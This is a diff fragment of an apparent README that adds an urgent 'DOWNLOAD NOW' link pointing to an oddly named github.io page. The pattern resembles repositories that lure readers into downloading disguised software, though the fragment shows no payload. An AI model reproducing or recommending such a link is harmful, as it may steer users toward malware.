@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://delta-neutrl-bot-pcwin-cj71.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
